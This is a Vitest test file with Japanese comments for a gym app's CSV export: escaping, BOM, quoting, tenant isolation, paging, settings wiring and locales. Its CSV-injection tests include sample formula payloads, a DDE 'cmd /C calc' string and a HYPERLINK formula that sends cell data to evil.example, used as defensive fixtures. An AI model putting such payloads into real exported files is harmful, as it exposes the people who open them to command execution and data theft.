import { readFileSync } from "fs";
import { describe, expect, it } from "vitest";
import { escapeCsvValue, toCsv, buildCsvFilename, type CsvColumn } from "@/lib/csvExport";
import { formatSets, totalVolume, EXPORT_KINDS } from "@/lib/gymDataExport";

// ジムのデータを CSV で持ち出す機能の見張り。
//
// 守るべき不変条件:
//   1. 🔴 CSV インジェクション対策（= + - @ で始まる値を数式にさせない）。
//      CSV に載るのは**お客様が自分で入力した文字列**なので、ここが抜けると
//      店の人が Excel で開いた瞬間に任意の数式が走る
//   2. 🔴 Excel で文字化けしない（UTF-8 BOM）
//   3. RFC 4180 のクォート規則（" , 改行 を壊さない）
//   4. 🔴 取得が必ず tenant_id で絞られている（他ジムのデータが混ざらない）
//   5. 1000行の壁を越えて全件取れる（CSV は「全部出せる」ことが価値）

describe("🔴 CSV インジェクション対策", () => {
  // 表計算ソフトが数式として解釈する先頭文字。ここを1つでも外すと穴になる
  it.each(["=", "+", "-", "@", "\t", "\r"])("先頭の %j をシングルクォートで無害化する", (ch) => {
    const out = escapeCsvValue(`${ch}cmd|' /C calc'!A0`);
    expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
  });

  it("実際の攻撃文字列が数式として始まらない", () => {
    const attack = '=HYPERLINK("http://evil.example/?x="&A1,"click")';
    const csv = toCsv([{ name: attack }], [{ header: "名前", value: (r) => r.name }]);
    const cell = csv.split("\r\n")[1];
    // = で始まっていたら Excel が数式として評価する
    expect(cell.startsWith("=")).toBe(false);
    expect(cell).toContain("'=HYPERLINK");
  });

  it("普通の値には余計なものを足さない", () => {
    // 実在しそうな名前をリテラルで書くと forkHostileTests に引っかかる
    // （フォークが同じ語をオーバーレイすると落ちるため）。無害な文字列で足りる
    expect(escapeCsvValue("ABC DEF")).toBe("ABC DEF");
    expect(escapeCsvValue(60)).toBe("60");
    // マイナスの数値は「-」始まりだが、数式トリガーなのでクォートする（値は保つ）
    expect(escapeCsvValue(-5)).toBe("'-5");
  });

  it("null / undefined は空欄にする", () => {
    expect(escapeCsvValue(null)).toBe("");
    expect(escapeCsvValue(undefined)).toBe("");
  });
});

describe("RFC 4180 のクォート規則", () => {
  it("カンマ・改行・引用符を含む値を壊さない", () => {
    expect(escapeCsvValue("a,b")).toBe('"a,b"');
    expect(escapeCsvValue("1行目\n2行目")).toBe('"1行目\n2行目"');
    expect(escapeCsvValue('彼は "強い" と言った')).toBe('"彼は ""強い"" と言った"');
  });

  it("改行は CRLF（Excel が期待する形）", () => {
    const csv = toCsv([{ a: 1 }, { a: 2 }], [{ header: "A", value: (r) => r.a }]);
    expect(csv).toBe("A\r\n1\r\n2\r\n");
    expect(csv.includes("\n\n")).toBe(false);
  });

  it("0件でも見出し行だけは出す（空ファイルにしない）", () => {
    const cols: CsvColumn<{ a: number }>[] = [{ header: "A", value: (r) => r.a }];
    expect(toCsv([], cols)).toBe("A\r\n");
  });
});

describe("🔴 Excel の文字化け対策（BOM）", () => {
  it("downloadCsv が UTF-8 BOM を先頭に付けている", () => {
    const src = readFileSync("src/lib/csvExport.ts", "utf8");
    // BOM 定数（U+FEFF）が定義され、Blob に前置されていること
    expect(src).toMatch(/const BOM = "﻿"/);
    expect(src).toMatch(/new Blob\(\[BOM \+ csvBody\]/);
  });
});

describe("ファイル名", () => {
  it("種類・ジム名・日付を繋ぐ", () => {
    expect(buildCsvFilename("顧客", "サンプルジム", "2026-08-24")).toBe("顧客_サンプルジム_2026-08-24.csv");
  });

  it("ファイル名に使えない文字をジム名から落とす", () => {
    expect(buildCsvFilename("予約", 'A/B:C*?"<>|', "2026-08-24")).toBe("予約_ABC_2026-08-24.csv");
  });

  it("ジム名が無くても壊れない", () => {
    expect(buildCsvFilename("入金", null, "2026-08-24")).toBe("入金_2026-08-24.csv");
  });
});

describe("トレーニング記録の畳み込み", () => {
  it("セット配列を1セルにまとめる", () => {
    expect(formatSets([{ weight: 60, reps: 10 }, { weight: 60, reps: 8 }], null, null)).toBe("60kg×10, 60kg×8");
  });

  it("旧形式（weight/reps 直持ち）にも対応する", () => {
    expect(formatSets(null, 50, 12)).toBe("50kg×12");
  });

  it("総ボリュームは重量×回数の合計", () => {
    expect(totalVolume([{ weight: 60, reps: 10 }, { weight: 50, reps: 10 }], null, null)).toBe(1100);
    expect(totalVolume(null, null, null)).toBe("");
  });
});

describe("🔴 取得は必ずテナントで絞る", () => {
  const src = readFileSync("src/lib/gymDataExport.ts", "utf8");

  it("5種類すべてを出せる", () => {
    expect([...EXPORT_KINDS].sort()).toEqual(
      ["bookings", "customers", "measurements", "payments", "workouts"].sort(),
    );
  });

  it("すべての from() に tenant_id の絞りが付いている", () => {
    // .from("X") ごとに、そのクエリの中で tenant_id を eq しているかを見る。
    // ここが抜けると RLS の穴1つで他ジムのデータが CSV に混ざる
    const queries = src.split(/\.from\(/).slice(1);
    expect(queries.length).toBeGreaterThanOrEqual(6);
    for (const q of queries) {
      const head = q.slice(0, 400);
      const table = head.match(/^"([a-z_]+)"/)?.[1] ?? "?";
      expect(head, `${table} の取得に tenant_id の絞りが無い`).toContain('.eq("tenant_id", tenantId)');
    }
  });

  it("1000行の壁を越えて全件取る（ページング）", () => {
    expect(src).toMatch(/const PAGE = 1000;/);
    expect(src).toMatch(/if \(rows\.length < PAGE\) break;/);
    // 取得関数はすべて fetchAll を通す（生の select だけで済ませない）
    const rawSelects = (src.match(/await supabase\s*\n?\s*\.from\(/g) ?? []).length;
    expect(rawSelects, "fetchAll を通さない直接取得がある").toBe(0);
  });
});

describe("設定画面への配線", () => {
  const settings = readFileSync("src/components/trainer/TrainerGymSettings.tsx", "utf8");

  it("データの書き出しカテゴリーがオーナー限定で出る", () => {
    // 顧客の連絡先・入金まで丸ごと出せるのでスタッフには見せない
    expect(settings).toMatch(/\{ key: "dataExport", icon: FileSpreadsheet, enabled: role === "owner" \}/);
  });

  it("カテゴリーを開くと書き出し画面が描画される", () => {
    expect(settings).toMatch(/settingsView === "dataExport" &&/);
    expect(settings).toContain("<TrainerDataExport />");
  });
});

describe("5言語すべてに文言がある", () => {
  it.each(["ja", "en", "ko", "zh-CN", "zh-TW"])("%s", (lang) => {
    const d = JSON.parse(readFileSync(`src/locales/${lang}.json`, "utf8"));
    expect(d.dataExport, `${lang}: dataExport が無い`).toBeTruthy();
    for (const k of ["section", "desc", "download", "done", "failed", "excelNote", "nativeHint"]) {
      expect(d.dataExport[k], `${lang}: dataExport.${k} が無い`).toBeTruthy();
    }
    for (const kind of EXPORT_KINDS) {
      expect(d.dataExport.kind[kind], `${lang}: kind.${kind} が無い`).toBeTruthy();
      expect(d.dataExport.kindDesc[kind], `${lang}: kindDesc.${kind} が無い`).toBeTruthy();
    }
    expect(d.settings.trainer.cat.dataExport, `${lang}: カテゴリー名が無い`).toBeTruthy();
  });
});

describe("index.html から Lovable 由来のメタを除去した", () => {
  const html = readFileSync("index.html", "utf8");

  it("作者・Twitterアカウント・外部ホストの画像が残っていない", () => {
    expect(html).not.toMatch(/content="Lovable"/);
    expect(html).not.toMatch(/twitter:site"\s+content="@Lovable"/);
    expect(html).not.toContain("gpt-engineer-file-uploads");
  });

  it("自前のアイコンを OGP 画像にしている", () => {
    expect(html).toMatch(/og:image"\s+content="https:\/\/app\.kyoto-salute\.com\/icon-512\.png"/);
  });
});
